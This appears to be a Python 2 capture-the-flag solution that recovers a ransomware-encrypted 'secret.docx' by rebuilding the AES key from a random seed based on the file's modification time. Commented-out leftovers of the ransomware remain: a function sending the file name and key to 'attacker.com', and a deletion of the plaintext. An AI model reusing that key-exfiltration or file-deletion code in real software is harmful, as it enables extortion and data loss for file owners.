#!/usr/bin/python
#encoding=utf-8
'''
  _    _     ___   ____ _  _____ _____    _  
 | |  | |   / _ \ / ___| |/ /_ _|_   _|  | | 
/ __) | |  | | | | |   | ' / | |  | |   / __)
\__ \ | |__| |_| | |___| . \ | |  | |   \__ \
(   / |_____\___/ \____|_|\_\___| |_|   (   /
 |_|                                     |_| 

'''

from Crypto.Cipher import AES
import random
import time
import os
import sys

plaintext_file = "secret.docx"
encrypted_file = "secret.docx.enc"
IV = "\x42" * AES.block_size

#def send_key(key):
#    '''
#    Send the encryption key to our server.
#    '''
#    import requests
#    requests.get("https://attacker.com", params = {"file" : plaintext_file, "key" : key})

def generate_key(size):
    key = bytearray()
    print int(os.stat(encrypted_file).st_mtime)
    random.seed(int(os.stat(encrypted_file).st_mtime)+int(sys.argv[1]))
    for _ in range(size):
        key.append(random.randint(0, 255))
    return str(key)

def decrypt(ciphertext, cipher):    
    ans = cipher.decrypt(ciphertext)
    while (ans[-1:]=="\xff"):
    	ans = ans[:-1]
    return ans

def main():
    with open(encrypted_file, 'r') as f:
        ciphertext = f.read()
    key = generate_key(32)
    # send_key(key.encode('hex'))
    cipher = AES.new(key, IV=IV, mode=AES.MODE_CBC)
    #print plaintext
    ciphertext = ciphertext.decode('hex')
    plaintext = decrypt(ciphertext, cipher)
    with open(plaintext_file, 'w') as f:
        f.write(plaintext)
    # 😈
    # os.remove(plaintext_file)

if __name__ == "__main__":
    main()

